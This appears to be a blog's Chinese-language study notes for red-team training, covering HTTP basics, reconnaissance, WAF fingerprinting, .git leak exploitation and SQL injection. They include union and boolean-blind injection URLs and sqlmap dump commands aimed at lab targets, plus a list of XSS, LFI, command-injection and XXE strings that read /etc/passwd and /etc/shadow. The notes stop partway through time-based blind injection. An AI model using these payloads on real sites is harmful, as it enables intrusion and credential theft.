# HVV     kali    service ssh start

## 渗透流程

![image-20220407184819260](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182011300-1803087857.png)

 hacke-r

1.APT组织

2.犯罪团伙

3.职业白帽

4.搞黑/灰产的

5.个人爱好

## HTTP协议

### TCP/IP协议簇

![image-20220407211533270](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182013739-1741101339.png)

### TCP/IP四层模型

数据链路层也叫MAC层

![image-20220407211625553](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182015454-618980508.png)

![image-20220407211921486](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182018367-880862432.png)

![image-20220407212154129](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182020862-1748053334.png)

![image-20220407212213970](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182021559-794129238.png)

### URL

![image-20220407214105925](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182023152-256432611.png)

![image-20220407214725925](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182024343-849863199.png)

![image-20220407214946479](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182024982-1964458419.png)

### WEB服务器

世界上第一个网站

http://info.cern.ch

![image-20220407215222781](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182025677-1061583030.png)

| 类型     | 描述                                              |
| -------- | ------------------------------------------------- |
| GET      | 请求从服务器获取资源                              |
| HEAD     | 类似于GET请求，只不过不会返回实体数据，只获取包头 |
| POST     | 向服务器提交数据                                  |
| PUT      | 替换服务器的内容                                  |
| DELETE   | 请求服务器删除指定的资源                          |
| TRACE    | 对链路进行测试或诊断                              |
| 。。。。 | 。。。。。。                                      |

### GET和POST的区别

| 对比项       | GET                                        | POST                   |
| ------------ | ------------------------------------------ | ---------------------- |
| 用途（语义） | 请求数据（查询、搜索）                     | 发送数据               |
| 后端处理     | 从URL获取参数                              | 从表单获取数据         |
| 可见性       | 参数在URL可见                              | 参数在URL不可见        |
| 安全性       | 安全性差，有浏览器历史，可保存书签，可缓存 | 安全性好               |
| 数据长度限制 | 浏览器会限制URL长度                        | 无限制                 |
| 数据类型限制 | 只允许ASCII字符                            | 无限制                 |
| 连接过程     | 产生一个TCP数据包                          | 产生两个TCP数据包***** |

![image-20220407222641401](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182027264-1025269843.png)

 ![image-20220407223517889](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182028700-135747636.png)

### 响应状态码



![image-20220407223833952](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182030319-1561391389.png)



### HTTP常见请求头和响应头 



![](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182031420-53139749.png)

HTTP特点总结

1.请求应答模式(Request/Response)

2.灵活可扩展

3.可靠传输’

4.无状态（Stateless）



HTTP服务器

Apache

Nginx

Tomcat

IIS

![image-20220407233354973](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182032198-1864973184.png)

## 信息收集

![image-20220408183940812](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182033140-2026359712.png)

![image-20220408215602333](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182034254-2073593203.png)

###  域名联系人等信息/whois

wanwang.aliyun.com

kali命令 whois  www.baIdu.com

whois.chinaz.com

whoissoft.com

whois.cnnic.cn

### 域名反查(用某些信息反查其他信息等)

whois.chinaz.com/reverse

icp.chinaz.com

beian.miit.gov.cn

icp.chinaz.com

beian88.com

tianyancha.com

17775248693

.........

#### 查询子域名

www.baidu.com

b.baidu.com

1.字典猜解

2.枚举

##### 工具

layer工具子域名挖掘机

在线查询：phpinfo.me/domain/

#### 域名解析信息

![image-20220408214224376](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182034968-458111246.png)

### DNS

![image-20220408214301429](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182035592-1097751216.png)

@：所有的地址

![image-20220408214325413](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182036659-1798820484.png)

### 域名解析

dbcha.com

netcraft.com

jsons.cn/nslookup

## IP信息收集

![3.3-IP信息-脑图笔记](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182037365-1805305729.png)

DNS解析流程

![image-20220408222558157](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182041040-936446851.png)

#### PING(因特网包探测器)

kali命令：nslookup baidu.com

查看DNS的记录：nslook -type="NS" baidu.com

### IP的归属

ipwhois.cnnic.net.cn

### 如何获取CDN背后的真正IP

#### CDN(内容分发网络)

![image-20220409113749983](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182042432-1327814383.png)

服务器群（服务器副本）

让不同地点的用户都能迅速的访问网站提供的内容

减少向源主机的访问量，只有当服务器群没有该数据才会向主机访问，

#### 常见CDN服务商

![image-20220409113730617](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182043115-1329458788.png)

#### CDN的服务

![image-20220409114328253](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182044126-515133308.png)

#### 获取IP方法

1.超级PING

查看IP数量：

kali命令：nslookup 12306.cn

![image-20220409114847289](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182044727-1721414023.png)

该wsglbo.com是CDN厂商

站长之家ping.chinaz.com



2.历史DNS

http://dnshistory.org/

http://toolbar.netcraft.com/site_report?url=

https://tools.ipip.net/cdn.php

https://github.com/vincentcox/bypass-firewalls-by-DNS-history



3.通过子域名查询IP

有可能主域名用了CDN但子域名没有(小公司有一定概率有)



4.国外主机解析

从国外访问由于CDN厂商没有覆盖到那么久可能获得真实的IP

https://asm.ca.com/zh_cn/ping.php

http://host-tracker.com/

http://www.webpagetest.org

https://dnscheck.pingdon.com/



5.其他

![image-20220409121136988](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182045130-820090255.png)

## 端口服务信息

 [3.4-端口服务信息-课件.pdf](..\2022HVV\课件笔记\3.4-端口服务信息-课件.pdf) 

### 端口扫描思路和代码实现

#### 查看本机端口信息

windows命令

netstat -aon|findstra 3306

Linux命令

netstart -an|grep 3306

远程机器端口

kali

telnet 192.168.142.137 80

wget 192.168.142.137 80

nc -vz 192.168.142.137 445-9000

### 常见端口及漏洞

https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf

 [common-ports.pdf](..\2022HVV\common-ports.pdf) 

#### 文件共享服务端口

![image-20220409124322553](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182046427-1483394313.png)

#### 远程连接服务端口

![image-20220409130313249](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182047948-608569318.png)

#### web应用服务端口

![image-20220409130426474](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182049968-1662758545.png)

#### 数据库服务端口

![image-20220409130523528](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182051763-381069380.png)

 #### 网络常见协议端口

![image-20220409132328317](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182052976-174757378.png)

#### 特殊服务端口

![image-20220409132353872](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182054811-1033435460.png)

#### Nmap

![image-20220409132529297](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182055880-1282028290.png)

![image-20220409132855325](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182057918-1708803263.png)

![image-20220409133525822](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182059201-1115248616.png)

![image-20220409134055390](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182100140-1601629294.png)

#### 常用参数

简单扫描

nmap -sP 192.168.142.137

指定端口或范围扫描：

nmap -p0-65535 192.168.142.137

探测操作系统：

nmap -O 192.168.142.137

只进行主机发现，不进行端口扫描

nmap -sn 192.168.40.195/24

![image-20220409140704625](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182101653-589430280.png)

#### Zenmap

Intense scan   强力扫描

Intense scan plus UDP  强力扫描的plus版 用UDP协议扫

Intense scan ,all TCP ports   ....用TCP协议去扫

Intense scan,no ping  ......无ping扫描

Ping scan  ping扫描

Quick scan   快速扫描的plus版本

Quick scan plus  快速扫描的plus版本

Quick traceroute   快速扫描并追踪它的路由

Regular scan        常规扫描

Slow comprehensive scan     慢且细致的扫描

#### 其他扫描工具

在线扫描

http://coolaf.com/tool/port



masscan,nbtscan.........

 

## CMS 指纹识别

### 什么是指纹识别

通过关键特征，识别出目标的CMS系统、服务器、开发语言、操作系统、CDN、WAF的类别版本等等

#### 识别对象

![image-20220409200003686](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182103395-1614529745.png)

CMS可能来源于开源的也有可能是自己搭建（例如：用html5+PHP等）

![image-20220409201258420](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182104788-1571502703.png)

![image-20220409202202063](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182105526-90614754.png)

![image-20220409202251740](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182107587-30469192.png)

#### CMS识别思路

页脚

版权信息

特定文件MD5值(图片，小图标，按钮，favicon(网站图标)，)

![image-20220410131502331](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182108313-1402099798.png)

下载这个图标，然后用算法算出该MD5值，然后与官方相匹配



查看网页源码

目录结构



通过特定文件分析

https://coolshell.cn/robots.txt        /robots.txt

![image-20220410144941394](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182108734-1258816587.png)

定义规则，不让百度爬取

#### CMS自动识别工具

kali命令：whatweb -v www.discuz,net

浏览器插件：

Wappalyzer:https://www.wappalyzer.com

whatruns:https://www.whatruns.com/

在线网站

whatweb.bugscaner.com

finger.tidesec.com/



离线网站

![image-20220410153312691](photo/image-20220410153312691.png)





其他开源程序

https://github.com/Tuhinshubhra/CMSeek

kali命令：cmseek

cmseek -u www.baidu.com         (超详细)



查看CDNname 别名记录

ping

nslookup

ldb www.12306.cn                               

（load balance detector）(负载均衡的探测器)

![image-20220410160130165](photo/image-20220410160130165.png)

## WAF指纹识别

### 什么是WAF（Web Application Firewall）

web应用防火墙

过滤HTTP/HTTPS的请求

开源产品：ModSecurity

### WAF的作用

![image-20220410160734327](photo/image-20220410160734327.png)

### WAF分类

- 硬件型WAF（厂商安装）
- 云WAF（阿里云、腾讯云、华为云）
- 软件型WAF（部署在Apache、Nginx等HTTPServer中）



### 常见WAF厂商

![image-20220410161121024](photo/image-20220410161121024.png)

![image-20220410161248561](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182109400-1281577654.png)

![image-20220410161345477](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182110190-952002439.png)

![image-20220410161355295](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182110924-1088245660.png)

![image-20220410161409810](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182111632-1470758377.png)

### WAF识别思路

额外的cookie；

任何响应或请求的附加标头；

响应内容（如果被阻止请求）；

响应代码（如果被阻止请求）；

IP地址（云WAF）;

JS客户端模块（客户端WAF）

 #### 如何触发拦截？

**xss**tring = '<script>alert("xss");</script>'

**sqli**string = "UNION SELECT ALL FROM information_schema AND'or SLEEP(5) or ' "

**lfi**string = '../../../etc/passwd'

**rce**string = '/bin/cat/etc/passwd;ping 127.0.0.1;curl google.com'

**xxe**string = '<!ENTITY xxe SYSTEM "file://etc/shadow">]><pwn>&hack;</pwn>'



####  工具

kali（自带）命令

wafw00f http://www.12306.cn

![image-20220410171235290](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182112075-1751937946.png)

![image-20220410171329371](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182112507-422072558.png)

nmap www.12306.cn --script=http-waf-detect.nse

sqlmap -u"xxx.com?id=1" --identify-waf

其他：

https://github.com/0xlnfection/Awesome-WAF    WAF（较详细介绍）

### 搜索引擎收集信息

#### Google Hacking

搜索语法

##### 运算法：

###### 完全匹配：“网络安全工程师”

###### 任意字词：批发 OR 特价

###### 不包含： bursuit -XXX

###### 数字范围： number..number

##### 高级语法：

###### 只搜索某个网站的内容：site:zhihu.com

###### 网页的内容包括：

- allintext:Powered by Discuz

- intext:Powered by Discuz

###### 网页标题的内容搜索：如下图（为网页标题）

![image-20220410174150911](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182112963-1722807097.png)

###### allintitle: 后台登录

###### intitle：后台登录

URL地址包括：

allinurl：admin.php

inurl:index.php?id=

###### 文件类型指定：filetype:pdf

index of（文件目录的泄露）



###### 语法数据库

https://www.exploit-db.com/google-hacking-database

https://github.com/BullsEye0/google_dork_list



##### 工具

github搜索：google hacking 、google dorks



### 网络空间搜索引擎

1、什么是网络空间（Cyber space）

 网络空间搜索引擎：

OSINT（Open source intelligence）开源网络情报

用网络扫描工具：nmap、zmap

方式：IP库、枚举

怎么标识一个设备呢？

爬虫 url

ip  域名

开放端口

操作系统

物理地址 深圳、北京

MAC地址

设备的类型

实施威胁地图：https://www.fireeye.com/cyber-map/threat-map.html

#### Shodan

搜索引擎

地图、截图、监控

kali自带

CLI：kali命令：

alert Manage the network alerts for your account   \# 管理账户的网络提示

convert Convert the given input data file into a... # 转换输入文件 

count Returns the number of results for a search # 返回查询结果数量 download Download search results and save them in a... # 下载查询结果到文件 

honeyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐 host View all available information for an IP... # 显示一个 IP 所有可用的详细信息 

info Shows general information about your account # 显示账户的一般信息 init Initialize the Shodan command-line # 初始化命令行 

myip Print your external IP address # 输出 用户当前公网IP 

parse Extract information out of compressed JSON... # 解析提取压缩的JSON信 息，即使用download下载的数据 

scan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段 

search Search the Shodan database # 查询 Shodan 数据库 

stats Provide summary information about a search... # 提供搜索结果的概要信息 

stream Stream data in real-time. # 实时显示 流数据 # 管理账户的网络提示

##### 工具

 https://github.com/jakejarvis/awesomeshodan-queries （语法） 

https://github.com/random-robbie/MyShodan-Scripts （python脚本）



#### Censys

没有收费，收录了证书，爬虫工具：ZMap和ZGrab

#### ZoomEye

网络空间资源测绘

xmap

可以搜索图标

#### FOFA

......

#### 网络空间集成搜索工具

 https://github.com/knownsec/Kunyu

 https://github.com/coco413/DiscoverTarget 

https://github.com/saucer-man/saucerfram



### 目录扫描

#### 什么是目录扫描

##### 1、部署的网站一些敏感的文件

- 配置文件 ——xxx.cfg
- 数据文件——xxx.sql
- 目录——/backup       /conf     /admin

**默认文件的配置出现问题**

##### 2、会泄露哪些信息：

数据库用户名和密码

服务器的用户名和密码

数据库的文件

##### 3、为什么会泄露：

配置不当的问题

本地文件包含:

Local file inclusion (LFI)

PHP:

header.php    common.php   footer.php  function.php

include("恶意代码")

include("路径/文件")——include("../../..")

require():

![image-20220412003222000](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182113371-434367276.png)



#### 常见的敏感目录和文件

robots.txt   (该文件是对爬虫机器人的限制，也安置了里面有某些关键的信息提示我们有哪些关键的目录和文件)

sitemap.xml(站点地图，指导搜索引擎收录哪些界面，包含了网站有哪些分类和详细的页面)

网站的备份文件/数据：

在线压缩——路径/文件名/wwwroot—20210819.zip(包含了文件的全部的代码)

帝国备份王——1.sql——1.zip

**所以要是备份网站的数据一定要记得把网站里的备份数据清理掉**

后台登录的目录——/admin——/manage

程序安装包（源码）：

——非开源，商用

——1.zip

——/install

上传目录： 文件上传漏洞 ——webshell              /upload      /upload.php    

mysql的管理界面：

300M的Mysql

web页面去管理

phpadmin

程序的安装路径—— /install

php的探针——phpinfo——雅黑探针

文本编辑器：

——Ueditor——https://github.com/fex-team/ueditor

——kindeditor

——Ckeditor（看它有什么漏洞）

Linux——cat   /etc/passwd   (定义了网站的用户)

——密码：cat /etc/shadow   加密方式:SH512

——/etc/sudoers  sudo（哪些用户能使用root的命令）

Macos——.DS_Store

编辑器的临时文件.swp

目录穿越——Windows IIS —— Apache

comcat WEB-INF:

——WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应 用组件配置及命名规则. 

——WEB-INF/database.properties : 数据库配置文件

 ——WEB-INF/classes/ : 一般用来存放Java类文件(.class) 

——WEB-INF/lib/ : 用来存放打包好的库(.jar)

—— WEB-INF/src/ : 用来放源代码(.asp和.php等

#### 文件扫描思路

做法 ——直接在域名后面拼接路径/文件名，如果返回 200，就是存在 

扫描方法：

—— 递归 dir xxx dir xxx

——字典 dict

——暴力破解——从1位开始爆破，从英文到数字逐一爆破

——爬虫        robots.txt         sitemap.xlml             网页中的其他链接

——fuzz（模糊测试）   字典  ——/word   /index.php?word=

#### 文件扫描的字典

wordlist

#### 工具

dirbuster

御剑

Burp Suite:

——Intruder——payload

www,baidu,com/$bbs$

DirBrute

 Dirsearch

 Dirmap 

wfuzz

#### 注意事项

WAF、IDS——代理——网络空间——搜索引擎

#### 防御

——权限

——删除敏感恩建

——WAF、IDS

### Git信息收集

#### 什么是版本控制系统

——代码的恢复、备份

1、修改仓库难以管理

2、整个工程直接打包，占用空间过多

——Version Control System

——发展阶段

1、本地VCS

2、协同开发——文件冲突？

自动合并不冲突、标记冲突的内容

集中化的VCS：SVN、CVS\CVCS

去中心化——分布式的CVS：dvcs

![image-20220415191401667](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182113783-1992864996.png)

#### Git区域划分

.git的文件夹就是版本仓库

![image-20220416003706007](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182114652-1704591344.png)

为什么Git会导致信息泄露：

1、把私有仓库/隐私文件提交到github

2、部署项目的时候，不小心把.git文件一起打包进去，放到web网站的目录下

![image-20220416121105883](photo/image-20220416121105883.png)

#### Github搜索技巧

kali in:file——搜索文件中包含kali的代码

kali in:path——搜索路径中包含kali的代码

kali in:path,file——搜索路径、文件中包含kali的代码

shodan language:python——搜索关键字shodan，语言为python的代码

filename:config.php language:php——搜索文件名为config.php,且语言为php

kali topics:>=5——标签数量大于等于5的

kali size:<1000——文件小于1kb的

kali star:10..50——star大于10小于50的

kali push:>2021-08-15——搜索在2021年8月15日之后提交的

kali push:2021-07-01..2021-08-01——搜索在此区间

kali created:>=2021-06-01——创建时间

kali push:<2021-08-01 -language:java——搜索在2020奶奶8月1日前push代码且排除java语言

#### Git信息泄露利用方式

1、找到.git文件夹

web网站可以通过目录扫描扫出来

从robots.txt找到这个文件不让查找（此地无银三百两）

搜索引擎搜索——intitle:"Index of /.git"     或者inurl:

2、把.git下载到本地

https://github.com/BugScanTeam/GitHack——python GitHack.py xxx.com/.git/

 https://github.com/lijiejie/GitHack 

https://github.com/wangyihang/githacker

 https://github.com/WangWen-Albert/ JGitHack 

![image-20220417133814652](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182115534-1965746280.png)

![image-20220417133854832](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182116409-868088026.png)

![image-20220417133923201](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182117205-399684217.png)

![image-20220417134007843](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182117818-1295849180.png)

3、用git的命令获取内容

git log

git reset——hard[log hash]

git diff

4、工具

https://github.com/gakki429/Git_Extract

#### 案例

ctfhub技能树

——Web——信息泄露——Git泄露——Log、Stash、Index

buuctf

——禁止套娃

——Mark loves cat

#### 信息收集总结

 [3.12-信息收集总结（无涯）.pdf](..\2022HVV\课件笔记\3.12-信息收集总结（无涯）.pdf) 

## SQL注入漏洞

### WEB网站基本架构

#### 什么是SQL注入

![image-20220419001904378](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182145406-612084475.png)

![image-20220419223953274](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182147411-467143170.png)

#### 域名：

通过DNS

顶级域名.com .net .org ....

国别/地区域名  .cn (中国)   .US(美国)  .jp(日本) ....

子域名:

www.baidu.com

tieba.baidu.com

1235.qzone.qq.com



 打开一个网站默认会打开一个文件目录下的index.php.html文件

#### 项目架构：

![image-20220424224310015](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182149540-2036079207.png)

### 如何构建可以执行的语句

#### SQL注入的发生

![image-20220424232127708](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182151052-213851695.png)

#### 如何获取数据库信息

获取的这些数据叫做元数据

- show命令

- select  + 函数

- 系统库

```mysql
show databases; #显示数据库的所有内容
use kb 
show tables;  #查看该kb目录下有哪些表
show columns from dvwa.users; #查看这个表有哪些字段和列，这个查看的是users的表


SELECT DATABASE();    #查看当前连接的信息
SELECT user();       #查看当前用户的信息  
select version();    



```



#### MySQL系统库

| 系统库             | 描述                                   |
| ------------------ | -------------------------------------- |
| information_schema | mysql服务器所有数据库的信息            |
| mysql              | 基存储数据库的用户、权限设置、关键字等 |
| performance_schema | 主要用于收集数据库服务器性能参数       |
| sys                | 数据来自performance_schema             |

```mysql
select schema_name from information_schema.SCHEMATA;  #查看所以的库名，在这个schema_name这个表的所有字段信息

select schema_name from information_schema.tables where table_schema='dvwa';  #获取这个库dvwa里的所有表名

SELECT column_name FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA='dvwa' and table_name = 'users'

```

#### 参数会如何处理

##### post请求

![image-20220426224138958](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182153323-29066268.png)



由于MySQL一般只执行一个语句所以要把语句合并成一条语句，才能执行

```mysql
SELECT * FROM test WHERE USER = '' and password = '' ;

SELECT * FROM test WHERE USER = '' SELECT database() -- ' and password =''

SELECT * FROM test WHERE USER = 'lkb'
union SELECT * FROM test WHERE USER = 'admin';
-- union的限制是前后两个字段必须一样

```

![image-20220427111934900](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182154102-549016522.png)

```mysql
SELECT * FROM test ORDER BY user ; #对于该列表进行排序
```

![image-20220427111959244](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182154640-463340242.png)

```mysql
SELECT * FROM test ORDER BY password ; -- 对于该列表进行反向排序
```

```mysql
SELECT * FROM test ORDER BY password aec;# 也可以用ase和desc 进行升序和降序的排列
```

```mysql
SELECT * FROM test ORDER BY 1 ;-- ORDER BY 1是对第一列进行查询可以用数字1，2，3对列表进行查询，当数字超过该列表因不存在该列会报错，可以以此知道有多少列
```

```mysql
SELECT * FROM test WHERE USER = '' order by 3  -- 'and password = '' 
```

```mysql
SELECT * FROM test WHERE USER = '' union SELECT DATABASE (),1 -- 'and password=''  #因为查出两个字段，而后面只有一个字段，所以在后面随便弄个数占位，然后就能查出库名了
```

##### get 请求

通过网址，对id进行判断对于id是否存在，错误就会报错，这是用get请求对其发起查询

![image-20220427132540892](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182155248-492873919.png)

在url里面会对其进行编码，所以可以用插件hackerbar来防止对其编码

对于网页想要对其注入首先要判断其能不能对其进行注入

最简单的判断在其后面加入一个单引号，execute

![image-20220427133015930](photo/image-20220427133015930.png)

因为在其语法里如果只有一个单引号会报错，因为单引号一般会成对出现，如果多了就会报错

还有这些常见的

```mysql

or 1=1--+
'or 1=1--+
''or 1=1--+
)or 1=1--+
')or 1=1--+
'')or 1=1--+
''))or 1=1--+

```

接着对网址使用order by 语句观察它前面藏了多少个语句 

```
http://localhost/school/url.php?id=1' order by 4 --+
```

发现它在第四个报错了之后，然后知道了前面有3个语句,然后在后面加两个占位

```
http://localhost/school/url.php?id=1' union select database(),1,1--+
```

可以把它直接变成-1使它查不到这个内容,以免混淆

```
http://localhost/school/url.php?id=-1' union select database(),1,1--+
```

![image-20220427135427096](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182155851-566003692.png)

如果这个只能返回一行的数据，多行会报错

```mysql
SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='dvwa';#dvwa的这个库里的有多少个表，然后用逗号去拼接起来
```

把多个值变为一个值,用逗号去分隔

![image-20220427140020745](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182156280-1608192751.png)

```
http://localhost/school/url.php?id=-1' union select 1,1,GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='dvwa'--+
```

然后用这个语句就可以查出来了

![image-20220427140504836](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182156801-515059957.png)



```
http://localhost/school/url.php?id=-1' union select 1,1,GROUP_CONCAT(coluumn_name) FROM information_schema.TABLES where TABLE_SCHEMA='dvwa' and TABLE NAME='users';--+  #查看的是dvwa的这个库里的users这个表里的全部类名类名这个字段名的column_name
```

![image-20220427141320686](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182157505-1364292328.png)

##### SQL注入的完整流程

- 判断是否可以注入
- 获得数据库名
- 获得表名
- 获得列名
- 获得数据

### sqlmap注入自动化工具

Introduction();--

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

| 类型                | 描述                         |
| ------------------- | ---------------------------- |
| boolean-based blind | 基于Boolean的盲注            |
| time-based blind    | 基于时间的盲注               |
| error-based         | 基于报错                     |
| UNION query-based   | 基于联合查询                 |
| stacked queruies    | 基于多条SQL语句（堆叠注入）  |
| out-of-band(OOB)    | 非应用内通信注入，比如DNSLog |

### sqlmap参数详解

sqlmap -hh 

基本用法： sqlmap.py -u "localhost/school/url.php?id=1"  #地址

### sqli-labs

sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --current-db

#--current-db拿到当前链接使用的库名

sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --level=5 --risk=3 --dbs 

#--dbs获取全部的库名 

 ##--level=5 如果它的级别越高他发送的payload就越高默认是1，并不是越高越好，太多防火墙之类的会禁掉ip

##--risk=3执行的一个风险系数范围是1~3，如果级别越高它会默认用更高级的语句，默认也是1

sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --level=5 --risk=3 -- dbms=mysql -D "security" --tables

#拿security这个库里的所有的表名

![image-20220428232110512](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182157945-333693184.png)

sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --level=5 --risk=3 -- dbms=mysql -D "security" -T "users" --col 

![image-20220428232243328](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182158390-88579116.png)

#"users" --col 拿users列名所有的字段  "security" -T指定表名

sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --level=5 --risk=3 -- dbms=mysql -D "security" -T "users" -C "password,username" --dump

![image-20220428232048178](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182159172-1281876780.png)

如果一堆网址的话

建立一个txt文本，把网址弄进去

sqlmap -m d:/18url.txt --batch

### 布尔盲注

基于布尔的盲注

![image-20220428233745417](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182159579-667332643.png)

适用场景：没有数据回显，条件正确有结果，错误没结果 

利用方式：构造判断条件(and)，逐个猜测（盲猜

思路：

1、当前数据库名字的长度，是不是1,2,3,4，。。。8位

2、数据库名字的第一个字母是不是a,b,c,d....

​	第2,3,4,5.。。。8个字母

3、先查第一个表名的长度

4、第一个字母。。。。

可以用二分法

```mysql
#截取字符
SELECT MID('abcdefghijklm',5,5); #从第五位（包括第五位）开始接着截取无位
SELECT substr('abcdefghijklm',5,5);#从第五位（包括第五位）开始接着截取无位，
SELECT left('abcdefghijklm',5);#从左边开始截取五位

#转成ascii码
SELECT ORD('a');
SELECT ASCII('a');

#正则(模糊匹配)
SELECT USER()  regexp '^ro';
SELECT USER() LIKE 'ro%';
```

![image-20220429111846568](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182200266-1317829396.png)

```
http://sqli-labs/Less-5/?id=1' and length(database())=8--
```

![image-20220429112214867](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182200880-1263932841.png)

```
http://sqli-labs/Less-5/?id=1' and left(database(),1)='h' -- 
```

```
http://sqli-labs/Less-5/?id=1' and ascii(substr(database(),2,1))=113 -- 
```

```
http://sqli-labs/Less-5/?id=1' and ascii(substr(database(),3,1))=100 --   #逐个尝试
```

```
http://sqli-labs/Less-5/?id=1' and ascii(substr((SELECT TABLE_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT  1,1),1,1))=113-- 
```

#查询的是tables的表的table_schema字段指定当前库名，LIMIT 0,1代表查的是第一个库，从第0个开始查，代表的是查第一个表的名字，# ,1,1))截取的是第一个表的第一个表的第一个字母

![image-20220429183711691](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182201763-1062056036.png)

然后就慢慢试....

接着拿列名

```
http://sqli-labs/Less-5/?id=1' and ASCII(substr((SELECT COLUMN_name FROM information_schema.COLUMNS WHERE TABLE_schema='SECURITY' AND TABLE_name ='emails' LIMIT 0,1),1,1)) =104 -- 
```

#查的是columns的这个表，column_name的这个列，指定security的这个库，email的这个表名

![image-20220429184653929](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182202475-1000006725.png)

#0,1),2,1))## 0是第一个列，2是第二个字母

```
http://sqli-labs/Less-5/?id=1' and ORD(mid((SELECT IFNULL(CAST(username AS char),0x20)FROM SECURITY.users ORDER BY id LIMIT 0,1),1,1))=68 -- 
```

#查users的这个表的username的这个字段的第一行数据 0,1的第一个值

,2,1)

### 基于时间的盲注

基于时间的盲注

![image-20220429190950789](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182203122-226524032.png)

适用场景：没有数据回显，条件正确与否结果一样 

利用方式：构造判断条件(and)，添加sleep，逐个猜测 （盲猜）

```mysql
